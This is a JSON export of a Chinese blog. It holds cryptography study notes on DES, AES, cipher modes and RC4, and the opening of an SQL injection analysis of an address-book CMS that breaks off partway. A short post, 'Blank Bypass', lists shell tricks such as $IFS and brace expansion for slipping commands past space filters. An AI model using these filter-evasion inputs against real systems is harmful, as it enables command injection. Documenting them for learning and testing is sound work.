[{"title":"密码学基础笔记(二)","url":"http://yoursite.com/2019/01/26/密码学基础笔记(二)/","content":"<h2 id=\"第三章-分组密码和数据加密标准（DES）\"><a href=\"#第三章-分组密码和数据加密标准（DES）\" class=\"headerlink\" title=\"第三章 分组密码和数据加密标准（DES）\"></a>第三章 分组密码和数据加密标准（DES）</h2><h3 id=\"流密码与分组密码\"><a href=\"#流密码与分组密码\" class=\"headerlink\" title=\"流密码与分组密码\"></a>流密码与分组密码</h3><p><img src=\"/images/mima/2-1.jpg\" alt=\"\"></p>\n<p>分组密码：</p>\n<blockquote>\n<p>所谓分组密码是将明文分成一组一组，在密钥的控制下，经过加密变换生成一组一组的密文。</p>\n<p>​       Step 1：将明文消息序列m1, m2, …, mi, …划分成等长的消息组（m1, …, mn），（mn+1, …, m2n），…</p>\n<p>​       Step 2：在密钥k=k1, k2, …, kn的控制下按固定的加密算法一组一组进行加密。</p>\n<p>​       Step 3：最后输出一组一组密文（c1, c2, …, cl），（cl+1, cl+2, …, c2l）。</p>\n<p>在相同密钥下，分组密码对每组明文所进行的变换是一样的，因此只需要研究对单独一组明文进行加密变换。</p>\n</blockquote>\n<h3 id=\"Feistel密码\"><a href=\"#Feistel密码\" class=\"headerlink\" title=\"Feistel密码\"></a>Feistel密码</h3><p>Feistel建议使用乘积密码的概念来逼近理想分组密码。乘积密码是指依次使用两个或两个以上基本密码，所得结果的密码强度将强于所有单个密码的强度。</p>\n<p><code>C=Enckn(...Enck2(Enck1(m))…)</code></p>\n<p>Feistel密码：</p>\n<ul>\n<li><p>代替：每个明文元素或元素组被唯一地替换为相应的密文元素或元素组。</p>\n</li>\n<li><p>置换：明文元素的序列被替换为该序列的一个置换。也就是说，序列里没有元素被添加，删除或替换，但序列里出现的顺序改变了。</p>\n</li>\n<li>扩散：将明文的统计特性散布到密文中去，这可以通过让每个明文数字尽可能地影响多个密文数字。</li>\n<li><p>混淆：使密文和密钥之间的统计关系尽可能复杂，以使敌手无法得到密钥。</p>\n</li>\n<li><p>分组长度: 分组越大则安全性越高，但加密速度就越慢。设计中最为普遍使用的是64比特。</p>\n</li>\n<li><p>密钥长度：密钥越长则安全性越高，但加密速度就越慢。现在普遍认为64比特或更短的密钥长度是不安全的，通常使用128比特的密钥长度。</p>\n</li>\n<li>迭代轮数：单轮结构远不足以保证安全性，但多轮结构可提供足够的安全性。典型地，轮数取为16。</li>\n<li>子密钥产生算法：该算法的复杂性越大，则密码分析的困难性就越大。</li>\n<li>轮函数F：轮函数的复杂性越大，密码分析的困难性也越大。</li>\n<li>快速软件加/解密：许多情况下，算法是被镶嵌在应用程序中，因而无法用硬件实现。此时算法的执行速度是考虑的关键。</li>\n<li>简化分析难度：如果算法能被无疑义地解释清楚，就可容易地分析算法抵抗攻击的能力，有助于设计高强度的算法。</li>\n</ul>\n<h3 id=\"数据加密标准（DES）\"><a href=\"#数据加密标准（DES）\" class=\"headerlink\" title=\"数据加密标准（DES）\"></a>数据加密标准（DES）</h3><p>在2001年高级加密标准（AES）提出前，DES一直是使用最广泛的加密方案。</p>\n<ul>\n<li><p>分组长度为64比特，密钥长度为56比特。</p>\n</li>\n<li><p>DES在1975年3月17日首次被公布在联邦记录中，经过大量的公开讨论后，DES于1977年1月15日被正式批准并作为美国联邦信息处理标准。</p>\n</li>\n<li><p>规定每隔5年由美国国家保密局作出评估，并重新批准它是否继续作为联邦加密标准。</p>\n</li>\n</ul>\n<p>DES加密算法概述：</p>\n<ul>\n<li>DES的结构是典型的Feistel密码结构。</li>\n<li>明文分组长度为64bit。</li>\n<li>密文分组长度为64bit。</li>\n<li>初始密钥长度为64bit。（其中，第8、16、24、32、40、48、56、64为奇偶校验位，因此，实际的密钥长为56bit。）</li>\n</ul>\n<p><img src=\"/images/mima/2-2.jpg\" alt=\"\"></p>\n<p>DES加密过程：</p>\n<ol>\n<li>初始置换IP：重排明文分组的64 bit数据。</li>\n<li>具有相同功能的16轮迭代：每轮中都有置换和代换运算，第16轮变换的输出分为左右两半，并交换次序。</li>\n<li>逆初始置换IP-1（IP的逆）：产生64 bit的密文。</li>\n</ol>\n<p>子密钥Ki的生成：</p>\n<ol>\n<li>初始密钥K为64 bit，首先置换选择PC1置换。</li>\n<li>将置换后的56 bit分为各28 bit的左、右两半，分别记为C0和D0。在第i轮分别对Ci-1和Di-1进行循环左移，移位后的结果作为求下一轮子密钥的输入，同时也作为置换选择PC2的输入。</li>\n<li>通过置换选择PC2产生的48 bit的Ki，即为i轮的子密钥，作为轮函数f (Ri-1, Ki)的输入。</li>\n</ol>\n<p>S盒代换：</p>\n<p>DES算法中除了S盒是非线性变换外，其余变换均为线性变换，S盒是经过精心设计和严格挑选的。</p>\n<p><strong>DES算法保密的关键在于S盒！</strong></p>\n<p>DES的解密过程：</p>\n<ul>\n<li>DES的加密算法具有可逆性，解密64 bit密文消息分组使用与加密相同的算法，所不同的是子密钥顺序使用相反，依次为 K16, K15, …, K1。</li>\n<li>当64 bit密文作为明文输入时，解密过程的第1轮迭代使用子密钥K16，第2轮迭代使用子密钥K15，…，第16轮迭代使用子密钥K1，结果输出得到64 bit明文。</li>\n</ul>\n<p>56位密钥的使用：</p>\n<p>在DES成为标准时，采用的密钥是56 bit，其密钥量仅为256约为1017个，难以抵抗穷举搜索攻击。</p>\n<p>问题主要集中在算法中的8个S盒上。DES密码体制的安全性依赖于非线性的S盒。S盒设计的详细准则一直没有公开，致使许多密码学家怀疑S盒设计中可能包含陷门。</p>\n<p>双重DES ：</p>\n<p>针对DES有效密钥长度偏短等安全性问题，人们利用实现DES的现有软硬件，寻求使用DES的多重加密方案以增加密码体制的强度。实用中一般广泛采用的有二重和三重DES等几种形式。</p>\n<h2 id=\"第四章-数学基础（略）\"><a href=\"#第四章-数学基础（略）\" class=\"headerlink\" title=\"第四章 数学基础（略）\"></a>第四章 数学基础（略）</h2><h2 id=\"第五章-AES\"><a href=\"#第五章-AES\" class=\"headerlink\" title=\"第五章 AES\"></a>第五章 AES</h2><p>AES应用实例：</p>\n<ul>\n<li>路由器</li>\n<li>安卓</li>\n<li>SIM卡</li>\n</ul>\n<h3 id=\"总体结构：\"><a href=\"#总体结构：\" class=\"headerlink\" title=\"总体结构：\"></a>总体结构：</h3><p>AES是一个迭代型分组密码：</p>\n<ul>\n<li>分组长度：可以独立地指定为128比特、192比特、256比特。</li>\n<li>密钥长度：可以独立地指定为128比特、192比特、256比特。</li>\n</ul>\n<p>状态、种子密钥和轮数：</p>\n<p>类似于明密文分组，算法的中间结果也分组，称中间结果的分组为状态，所有的操作都在状态上进行。</p>\n<ul>\n<li>状态可以用以字节为元素的矩阵表示，该矩阵有4行，列数记为Nb，Nb等于分组长度除以32。</li>\n<li>种子密钥也用一个以字节为元素的矩阵表示，该矩阵有4行，列数记为Nk，Nk等于分组长度除以32。</li>\n</ul>\n<p>迭代的轮数记为Nr，Nr与Nb和Nk有关，Nr与Nb和Nk的关系如下表：</p>\n<p><img src=\"/images/mima/2-3.jpg\" alt=\"\"></p>\n<h3 id=\"详细结构\"><a href=\"#详细结构\" class=\"headerlink\" title=\"详细结构\"></a>详细结构</h3><p>当Nk等于4时，整个算法由10轮组成。每轮由4个变换模块组成，分别是：</p>\n<ol>\n<li>字节代换（ByteSub）</li>\n<li>行移位（ShiftRow）</li>\n<li>列混合（MixColumn）</li>\n<li>轮密钥加（AddRoundKey）</li>\n</ol>\n<p>最后一轮略有不同，没有列混合。</p>\n<p><img src=\"/images/mima/2-4.png\" alt=\"\"></p>\n<p>加密过程：</p>\n<ol>\n<li>初始轮密钥加</li>\n<li>Nr-1轮迭代</li>\n<li>最后一轮变换</li>\n</ol>\n<h3 id=\"字节代替变换（ByteSub）\"><a href=\"#字节代替变换（ByteSub）\" class=\"headerlink\" title=\"字节代替变换（ByteSub）\"></a>字节代替变换（ByteSub）</h3><p>字节代换是非线形变换，独立地对状态的每个字节进行。代换表（即S-盒）是可逆的，由以下两个变换的合成得到：  </p>\n<ol>\n<li>首先，将字节看作GF(28)上的元素，映射到自己的乘法逆元，00映射到自己。</li>\n<li>其次，对字节做如下的（GF(2)上的，可逆的）仿射变换：</li>\n</ol>\n<p><img src=\"/images/mima/2-5.png\" alt=\"\"></p>\n<h3 id=\"行移位变换（ShiftRow）\"><a href=\"#行移位变换（ShiftRow）\" class=\"headerlink\" title=\"行移位变换（ShiftRow）\"></a>行移位变换（ShiftRow）</h3><p>状态矩阵State中的每一行将以字节为单位，循环左移不同的位移量。</p>\n<ul>\n<li>第一行：保持不变</li>\n<li>第二行：循环左移一个字节</li>\n<li>第三行：循环左移两个字节</li>\n<li>第四行：循环左移三个字节 </li>\n</ul>\n<h3 id=\"列混合变换（MixColumn）\"><a href=\"#列混合变换（MixColumn）\" class=\"headerlink\" title=\"列混合变换（MixColumn）\"></a>列混合变换（MixColumn）</h3><p>将State乘以一个固定的矩阵A。</p>\n<h3 id=\"轮密钥加变换（AddRoundKey）\"><a href=\"#轮密钥加变换（AddRoundKey）\" class=\"headerlink\" title=\"轮密钥加变换（AddRoundKey）\"></a>轮密钥加变换（AddRoundKey）</h3><p>密钥加是将轮密钥Ki简单地与状态State进行逐比特异或。</p>\n<h3 id=\"AES的密钥扩展\"><a href=\"#AES的密钥扩展\" class=\"headerlink\" title=\"AES的密钥扩展\"></a>AES的密钥扩展</h3><p>密钥扩展指从种子密钥得到轮密钥的过程，其基本原则如下： </p>\n<ul>\n<li>轮密钥的比特数等于分组长度乘以轮数加1：128 bit × (10+1) = 1408 bit</li>\n<li>种子密钥被扩展成为扩展密钥（<strong>密钥扩展</strong>）。</li>\n<li>轮密钥从扩展密钥中取，其中第1轮轮密钥取扩展密钥的前Nb个字，第2轮轮密钥取接下来的Nb个字，如此下去（<strong>轮密钥选取</strong>）。</li>\n</ul>\n<h3 id=\"密钥扩展算法\"><a href=\"#密钥扩展算法\" class=\"headerlink\" title=\"密钥扩展算法\"></a>密钥扩展算法</h3><p>将种子密钥扩展为扩展密钥的计算过程如下：</p>\n<p><img src=\"/images/mima/2-6.png\" alt=\"\"></p>\n<p>当种子密钥长度为128bit时，Nk＝4：</p>\n<p><code>temp = SubByte(RotByte(W[i-1])) Å Rcon[i/Nk]</code> </p>\n<ul>\n<li>RotByte( )：循环左移一个字节，如W=(a0, a1, a2, a3)，则RotByte(W)=(a1, a2, a3, a0)。</li>\n<li>SubByte( )：S盒的字节代换。</li>\n<li>Rcon[i]：轮常数</li>\n</ul>\n<p><img src=\"/images/mima/2-7.png\" alt=\"\"></p>\n<h3 id=\"AES的解密过程\"><a href=\"#AES的解密过程\" class=\"headerlink\" title=\"AES的解密过程\"></a>AES的解密过程</h3><p><strong>AES加密算法的每一步都可逆！</strong></p>\n<h2 id=\"第6章-分组密码的工作模式\"><a href=\"#第6章-分组密码的工作模式\" class=\"headerlink\" title=\"第6章  分组密码的工作模式\"></a>第6章  分组密码的工作模式</h2><p>分组密码的工作模式：</p>\n<blockquote>\n<p>为了能在各种应用场合使用DES，1980年，美国在FIPSPUS 81中标准化了DES算法的四种工作模式，后来对AES算法研发过程中，增加了新的工作模式，这些模式适用于任何分组密码算法。</p>\n</blockquote>\n<p>五种常用的工作模式为:</p>\n<p>1.电码本（Electronics Code Book，ECB）</p>\n<p>2.密文分组链接（Cipher Block Chaining，CBC）</p>\n<p>3.密文反馈（Cipher-FeedBack，CFB）</p>\n<p>4.输出反馈（Output-FeedBack，OFB）</p>\n<p>5.计数器（Counter，CTR）</p>\n<p>为了方便描述，定义如下符号：</p>\n<ul>\n<li>Ek：分组密码加密算法</li>\n<li>M1, M2, …, Mn：明文消息中n个连续的分组</li>\n<li>C1,  C2,  …,  Cn：密文消息中n个连续的分组</li>\n<li>IV：初始向量，是一个随机比特串</li>\n<li>HSj(A)：A的j个最高有效位，例如HS8(0010101110100101)=00101011</li>\n<li>LSj(A)：A中除了j个最高位外剩下的有效位，例如LS8(0010101110100101)=10100101</li>\n<li>A||B：消息分组A和B的链接</li>\n</ul>\n<h3 id=\"电码本模式\"><a href=\"#电码本模式\" class=\"headerlink\" title=\"电码本模式\"></a>电码本模式</h3><p>电码本模式是分组密码的一个直接应用：它一次对一个明文分组Mi直接加密，每次的加密密钥k都相同。</p>\n<p>当密钥k取定时，对明文的每一个分组Mi，都有一个惟一的密文分组Ci与之对应。ECB模式的加密过程为：</p>\n<p><code>Ci=Ek(Mi)，i=1，2，…，n</code></p>\n<ul>\n<li><p>ECB模式的优点：当改变一个明文分组值的时候，仅仅会引起相应的密文分组取值发生变化，而其他密文分组不受影响。</p>\n</li>\n<li><p>ECB模式的缺点：相同的明文分组会产生相同的密文分组，易暴露明文的固有格式。因此ECB不适用于长消息，建议在大多数情况下不要使用ECB模式进行加密操作。</p>\n</li>\n</ul>\n<h3 id=\"密文分组链接模式\"><a href=\"#密文分组链接模式\" class=\"headerlink\" title=\"密文分组链接模式\"></a>密文分组链接模式</h3><p>密码分组链接模式是用于普通数据加密的一种分组密码工作模式。CBC解决了ECB的安全缺陷，可以让重复的明文分组产生不同的密文分组。</p>\n<p><code>C0=IV,</code><br><code>Ci=Ek(MiÅCi-1)，</code></p>\n<p><code>i=1,2, …, n</code></p>\n<ul>\n<li><p>CBC模式的优点：CBC模式输出的是随机化的密文分组，CBC模式适用于较长的明文消息进行加密。</p>\n</li>\n<li><p>CBC模式的缺点：当信道噪音等干扰带来密文传输错误时，密文中一位的错误将影响当前分组及下一分组的解密。</p>\n</li>\n</ul>\n<h3 id=\"密文反馈模式\"><a href=\"#密文反馈模式\" class=\"headerlink\" title=\"密文反馈模式\"></a>密文反馈模式</h3><p>设传送的每个单元（如一个字符）是j比特长，通常取j=8。以IV作为初始的b比特随机输入分组，存放于移位寄存器中。</p>\n<p><code>I1= IV                            Ii=LSj(Ii-1)||Ci-1     (i=2,3,…,n)</code></p>\n<p><code>O1=Ek(I1)                    Oi=Ek(Ii)          (i=2,3,…,n)</code></p>\n<p><code>C1=M1ÅHSj(O1)         Ci=MiÅHSj(Oi)  (i=2,3,…,n)</code></p>\n<ul>\n<li><p>CFB模式的优点：随机化密文。</p>\n</li>\n<li><p>CFB模式的缺点：当信道噪音等干扰带来密文传输错误时，密文中一位的错误将影响当前分组及下一分组的解密。</p>\n</li>\n</ul>\n<h3 id=\"输出反馈模式\"><a href=\"#输出反馈模式\" class=\"headerlink\" title=\"输出反馈模式\"></a>输出反馈模式</h3><p>输出反馈模式在结构上类似于CFB模式，两种模式的不同之处在于：</p>\n<ul>\n<li><p>OFB：将加密算法的输出反馈到移位寄存器</p>\n</li>\n<li><p>CFB：将密文单元反馈到移位寄存器</p>\n</li>\n</ul>\n<h3 id=\"计数器模式\"><a href=\"#计数器模式\" class=\"headerlink\" title=\"计数器模式\"></a>计数器模式</h3><p>计数器模式要求计数器的长度与分组长度相同，它将计数器从初始值开始计数所得到的值作为分组加密算法的输入，经过加密算法变换后的结果与明文分组异或，得到密文分组。</p>\n<p><code>Ci=MiÅE(Ctri)，i=1,2, …, n</code></p>\n<ul>\n<li>CRT模式的优点：<ul>\n<li>可以处理任意长度的数据，而且加密-解密过程仅涉及加密运算，不涉及解密运算，因此不用实现解密算法。</li>\n<li>能并行处理，即能同时对多个分组的加密-解密进行处理，而不必等到前面分组处理完才开始，而且可以提前进行预处理，这也可以极大地提高处理效率。</li>\n<li>可以随机地对任意一个密文分组进行解密，对该密文分组的处理与其他密文无关。</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/mima/2-8.jpg\" alt=\"\"></p>\n<h2 id=\"第七章-伪随机数的产生和流密码\"><a href=\"#第七章-伪随机数的产生和流密码\" class=\"headerlink\" title=\"第七章 伪随机数的产生和流密码\"></a>第七章 伪随机数的产生和流密码</h2><h3 id=\"随机数的使用\"><a href=\"#随机数的使用\" class=\"headerlink\" title=\"随机数的使用\"></a>随机数的使用</h3><p>大量密码算法或网络安全协议都需要随机数，如：</p>\n<ul>\n<li>密钥分发和认证</li>\n<li>会话密钥的产生</li>\n<li>RSA等公钥密码算法</li>\n<li>对称密码的密钥 </li>\n</ul>\n<p>现实中的随机数：</p>\n<ul>\n<li>手机动态验证码</li>\n<li>动态验证码</li>\n<li>密码器</li>\n</ul>\n<h3 id=\"随机数的使用-1\"><a href=\"#随机数的使用-1\" class=\"headerlink\" title=\"随机数的使用\"></a>随机数的使用</h3><p>这些应用对随机数序列产生提出了两个不同的要求：随机性和不可预测性。 </p>\n<ul>\n<li>随机性<ul>\n<li>分布均匀性：能通过均匀性检验、独立性检验、游程检验等基本的统计特性检验。</li>\n<li>独立性：序列中任何子序列不能由其他子序列推导出。</li>\n</ul>\n</li>\n<li>不可预测性<ul>\n<li>指即使给出产生序列的硬件和所有以前产生的序列的全部知识，也不可能预测下一个随机位是什么。因此，随机序列是非周期的。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"伪随机数发生器\"><a href=\"#伪随机数发生器\" class=\"headerlink\" title=\"伪随机数发生器\"></a>伪随机数发生器</h3><ul>\n<li>物理方法：利用自然界的一些真的随机物理量，如放射性衰变、宇宙射线的触发时间等。</li>\n<li>计算机产生（数学方法）：由一个初始状态（称为“种子”）开始，通过一个确定的算法来生成。一旦给定算法和种子值，输出序列就是确定的了，因此有一定的周期性，规律性和重复性，不是真正的随机数，通常称之为伪随机数。产生伪随机数的算法或硬件一般称为伪随机数发生器。</li>\n</ul>\n<h3 id=\"BBS发生器\"><a href=\"#BBS发生器\" class=\"headerlink\" title=\"BBS发生器\"></a>BBS发生器</h3><p>BBS（Blum-Blum-Shub）产生器是可证明安全的伪随机比特序列产生器。</p>\n<p>首先选择两个大素数p和q，满足</p>\n<p><code>p ≡ q ≡ 3 (mod 4)</code></p>\n<p>令n = pq。再选一随机数s，使得s与n互素。</p>\n<p>BBS产生器产生伪随机序列的算法如下：</p>\n<p>​                       <code>X0 = s2 mod n</code></p>\n<p>​                       for i = 1 to ∞ do {</p>\n<p>​              Xi = X2i-1 mod n;</p>\n<p>​              R</p>\n<p><code>i</code></p>\n<p> = X</p>\n<p><code>i</code></p>\n<p> <code>mod 2 }</code></p>\n<h3 id=\"流密码\"><a href=\"#流密码\" class=\"headerlink\" title=\"流密码\"></a>流密码</h3><p>流密码结构图：</p>\n<p><img src=\"/images/mima/2-9.png\" alt=\"\"></p>\n<h3 id=\"RC4算法\"><a href=\"#RC4算法\" class=\"headerlink\" title=\"RC4算法\"></a>RC4算法</h3><p>RC4是MIT的Rivest开发的，是使用最为广泛的流密码算法之一。</p>\n<ul>\n<li>RC4的大小由参数n确定。对于一个n位长的字（或0, 1 序列），有2n种不同的排列方式，对应2n个不同的元素（或状态），这些元素组成一个长为2n的数组S。</li>\n<li>RC4每次随机选取数组S中的一个元素输出作为密钥k。</li>\n</ul>\n<p>RC4包含了两个算法：</p>\n<p>1.密钥调度算法（Key Scheduling Algorithm, KSA）：设置数组S的初始排序。</p>\n<p>2.伪随机生成算法（Pseud Random Generation Algorithm, PRGA）：随机选取元素作为密钥k输出并修改数组S的原始排序，每产生一个密钥k，数组S就被重新排列一次。</p>\n<p>KSA算法：</p>\n<ul>\n<li>常用的RC4的n=8，此时，RC4可以生成28=256个元素的数组S。KSA初始化S，取</li>\n</ul>\n<p>S[i]=i (i=0, 1, …, 255) </p>\n<ul>\n<li><p>选择0到255之间的一个子序列作为密钥，填充到密钥数组K[i]=i(i=0, 1, …, 255)中。填充时，这个密钥不断地重复直到填满整个密钥数组。</p>\n</li>\n<li><p>然后利用以下算法实现数组S的初始随机化排列。</p>\n</li>\n</ul>\n<p>​       <code>j=0;</code></p>\n<p>​      for i=0 to 255 do</p>\n<p>​       j=j+S[i]+K[i] (mod 256);</p>\n<p>​      <code>swap (S[i], S[j]);</code></p>\n<p>PRGA算法：</p>\n<p>在KSA将数组S进行初始排序的基础上，PRGA从数组S中随机选取元素作为密钥流字节，同时修改S的排序，以便于下一次密钥流的选取。</p>\n<p> 选取过程取决于索引i和j，这两个索引都从0开始，选取时重复执行以下算法，直到产生与明文的长度相等的密钥流。</p>\n<p>​                <code>i=i+1 (mod 256);</code></p>\n<p>​                j=j+S[i] (mod 256);</p>\n<p>​                swap (S[i], S[j]);</p>\n<p>​                t=S[i]+S[j] (mod 256);</p>\n<p>​                k=S[t];</p>\n<p>​                <code>output k=S[t];</code> </p>\n<p> 从算法中可以看出，索引i保证每个元素的改变，索引j保证元素改变的随机性。</p>\n<blockquote>\n<p>RC4的优点是在软件容易实现且运行速度快。RC4广泛用于商业密码产品中，如用于属于IEEE<br>802.11无线LAN标准的WEP协议和更新的WiFi保护访问协议等。目前所用的初始密钥一般至少为128<br>位。</p>\n<p>关于分析RC4的攻击方法有许多公开发表的文献。但是当密钥长度很大时，比如128位，没有那种攻击方法有效。</p>\n</blockquote>\n","categories":[],"tags":["密码学"]},{"title":"密码学基础笔记(一)","url":"http://yoursite.com/2019/01/07/密码学基础笔记(一)/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>看到第一学期开了密码学这门课，本来想好好学一下的，没想到计划赶不上变化居然忙到根本没有时间上课，希望不会挂掉（哭。。。</p>\n<h2 id=\"第一章-概览\"><a href=\"#第一章-概览\" class=\"headerlink\" title=\"第一章 概览\"></a>第一章 概览</h2><h3 id=\"计算机安全概念\"><a href=\"#计算机安全概念\" class=\"headerlink\" title=\"计算机安全概念\"></a>计算机安全概念</h3><p>定义：</p>\n<blockquote>\n<p>“对于一个自动化的信息系统，采取保护措施确保信息系统资源（包括硬件、软件、固件、信息/数据和通信）的保密性、完整性、可用性。”</p>\n</blockquote>\n<p>3个关键目标（CIA）：</p>\n<ul>\n<li>保密性（Confidentiality）<ul>\n<li>数据保密性</li>\n<li>隐私性</li>\n</ul>\n</li>\n<li>完整性（Integrity）<ul>\n<li>数据完整性</li>\n<li>系统完整性</li>\n</ul>\n</li>\n<li>可用性（Availability）</li>\n</ul>\n<p>其他概念：</p>\n<ul>\n<li>真实性（Authenticity）</li>\n<li>可追溯性（Accountability）</li>\n</ul>\n<h3 id=\"OSI安全框架\"><a href=\"#OSI安全框架\" class=\"headerlink\" title=\"OSI安全框架\"></a>OSI安全框架</h3><p>主要关注：</p>\n<ul>\n<li><p>安全攻击</p>\n<ul>\n<li>被动攻击<ul>\n<li>信息内容的泄露</li>\n<li>流量分析</li>\n</ul>\n</li>\n<li>主动攻击<ul>\n<li>伪装</li>\n<li>重播</li>\n<li>消息修改</li>\n<li>拒绝服务</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>安全机制<ul>\n<li>特定安全机制：加密、数字签名、访问控制、数据完整性、认证交换、流量填充、路由控制、公证。</li>\n<li>普遍安全机制：可信功能、安全标签、事件检测、安全审计跟踪、安全恢复。</li>\n</ul>\n</li>\n<li>安全服务<ul>\n<li>认证</li>\n<li>访问控制</li>\n<li>数据保密性</li>\n<li>数据完整性</li>\n<li>不可否认性</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>是一种由系统提供的对系统资源进行特殊保护的处理或通信服务。(RFC4949)</p>\n</blockquote>\n<h3 id=\"网络安全模型\"><a href=\"#网络安全模型\" class=\"headerlink\" title=\"网络安全模型\"></a>网络安全模型</h3><p><img src=\"/images/网络安全模型.png\" alt=\"\"></p>\n<p>可信第三方：</p>\n<ul>\n<li>第三方负责将秘密信息分配给通信双方，而对攻击者保密。</li>\n<li>或者当通信双方关于信息传输的真实性发生争执时，由第三方来仲裁。</li>\n</ul>\n<p>安全服务：</p>\n<ol>\n<li>设计算法</li>\n<li>产生秘密信息</li>\n<li>分配和共享</li>\n<li>指明协议实现安全服务</li>\n</ol>\n<h2 id=\"第二章-传统加密技术\"><a href=\"#第二章-传统加密技术\" class=\"headerlink\" title=\"第二章 传统加密技术\"></a>第二章 传统加密技术</h2><h3 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h3><ul>\n<li><p>密码学</p>\n<ul>\n<li>密码编码学</li>\n<li>密码分析学</li>\n</ul>\n</li>\n<li><p>明文：原始的消息</p>\n</li>\n<li>密文： 加密后的消息</li>\n<li>加密：从明文到密文的变换过程</li>\n<li>解密：从密文到明文的变换过程</li>\n</ul>\n<h3 id=\"对称密码模型\"><a href=\"#对称密码模型\" class=\"headerlink\" title=\"对称密码模型\"></a>对称密码模型</h3><p>5个基本成分：</p>\n<ul>\n<li>明文</li>\n<li>加密算法</li>\n<li>密钥</li>\n<li>密文</li>\n<li>解密算法</li>\n</ul>\n<p><img src=\"/images/对称密码模型.png\" alt=\"\">     </p>\n<ul>\n<li><p>加密算法根据输入信息X和密钥K生成密文Y=[Y1, Y2, …, YN]，即Y=E[K, X]。</p>\n</li>\n<li><p>有密钥K的合法接收者，可进行解密变换X=D[K, Y]。</p>\n</li>\n</ul>\n<p><img src=\"/images/对称密码体制.png\" alt=\"\"></p>\n<h3 id=\"密码编码学\"><a href=\"#密码编码学\" class=\"headerlink\" title=\"密码编码学\"></a>密码编码学</h3><p>3个独立特征：</p>\n<ol>\n<li>转换明文为密文的运算类型：代替 vs. 置换。</li>\n<li>所用的密钥数：对称密码 vs. 公钥密码。</li>\n<li>处理明文的方法：分组密码 vs. 流密码。</li>\n</ol>\n<h3 id=\"密码分析学和穷举攻击\"><a href=\"#密码分析学和穷举攻击\" class=\"headerlink\" title=\"密码分析学和穷举攻击\"></a>密码分析学和穷举攻击</h3><p>攻击通用方法：</p>\n<ul>\n<li>密码分析学</li>\n<li>穷举攻击</li>\n</ul>\n<blockquote>\n<p>Kerckhoffs原则：假定密码攻击者知道加密数据所使用的算法，数据的安全性应当取决于密钥的选择。</p>\n<p>​    <strong>无条件安全</strong>：无论花多少时间，攻击者都无法解密密文。</p>\n<p>​    Shannon已经证明：除了一次一密之外，所有的加密算法都不会是无条件安全的。</p>\n</blockquote>\n<p>加密算法应尽量满足：</p>\n<ul>\n<li><p>破译密码的<strong>代价</strong>超出密文信息的价值</p>\n</li>\n<li><p>破译密码的<strong>时间</strong>超出密文信息的有效生命期</p>\n</li>\n</ul>\n<p>如果加密体制满足了上述两条标准中的任意一条，则它是<strong>计算安全</strong>的。然而，估计攻击者成功破译密文所需的工作量是非常困难的。</p>\n<h3 id=\"代替技术\"><a href=\"#代替技术\" class=\"headerlink\" title=\"代替技术\"></a>代替技术</h3><p><strong>Caesar密码</strong>：</p>\n<blockquote>\n<p>对字母表中的每个字母，用它之后的第3个字母来代替</p>\n</blockquote>\n<p>细节：</p>\n<ol>\n<li>加密算法：Ek(m) ≡ m + 3 (mod 26)</li>\n<li>解密算法：Dk(c) ≡ c - 3 (mod 26)</li>\n</ol>\n<blockquote>\n<p>凯撒密码的密钥空间太小，穷举攻击25种可能</p>\n</blockquote>\n<p><strong>单表代替密码</strong>：</p>\n<blockquote>\n<p>Caesar密码只有25种可能的密钥，是不安全的。通过允许任意代替，密钥空间将会急剧增大。一般，具有n个元素的集合有n!个置换。如果密文是26个字母的任意置换，那么就有26!种可能的密钥。</p>\n</blockquote>\n<p><strong>Playfair密码</strong>：</p>\n<p>基于一个5×5的字母矩阵。字母矩阵构造方法如下：</p>\n<ol>\n<li>选一个英文短语或单词作为密钥，去掉其中重复的字母得到一个无重复字母的字符串。</li>\n<li>然后再将字母表中剩下的字母依次从左到右、从上往下填入矩阵中，字母i，j占同一个位置。</li>\n</ol>\n","categories":[],"tags":["密码学"]},{"title":"Blank Bypass","url":"http://yoursite.com/2018/11/15/Blank Bypass/","content":"<ol>\n<li><p>cat&lt;1.txt</p>\n<p><img src=\"/images/black1.PNG\" alt=\"\"></p>\n</li>\n<li><p>cat$IFS$91.txt</p>\n<p><img src=\"/images/black2.PNG\" alt=\"\"></p>\n</li>\n<li><p>cat${IFS}1.txt</p>\n<p><img src=\"/images/black3.PNG\" alt=\"\"></p>\n</li>\n<li><p>cat&lt;&gt;1.txt</p>\n<p><img src=\"/images/black4.PNG\" alt=\"\"></p>\n</li>\n<li><p>{cat,1.txt}</p>\n<p><img src=\"/images/black5.PNG\" alt=\"\"></p>\n</li>\n<li><p>CMD=$’\\x201.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black6.PNG\" alt=\"\"></p>\n</li>\n<li><p>CMD=$’\\x0a1.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black7.PNG\" alt=\"\"></p>\n</li>\n<li><p>CMD=$’\\x091.txt’&amp;&amp;cat$CMD</p>\n<p><img src=\"/images/black8.PNG\" alt=\"\"></p>\n</li>\n</ol>\n","categories":[],"tags":["linux"]},{"title":"EML企业通讯录管理系统两处注入分析","url":"http://yoursite.com/2018/08/12/EML企业通讯录管理系统两处注入分析/","content":"<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。</p>\n<h1 id=\"0x01-漏洞环境\"><a href=\"#0x01-漏洞环境\" class=\"headerlink\" title=\"0x01 漏洞环境\"></a>0x01 漏洞环境</h1><p>CMS：EML企业通讯录管理系统</p>\n<p>版本：5.4.5</p>\n<p>官方网站：<a href=\"http://bbs.emlsoft.com\" target=\"_blank\" rel=\"external\">http://bbs.emlsoft.com</a> </p>\n<p>更新时间：2018.7.26 </p>\n<p>测试环境：windows10+phpstudy+php5.5</p>\n<h1 id=\"0x02-漏洞分析\"><a href=\"#0x02-漏洞分析\" class=\"headerlink\" title=\"0x02 漏洞分析\"></a>0x02 漏洞分析</h1><h3 id=\"过滤函数：\"><a href=\"#过滤函数：\" class=\"headerlink\" 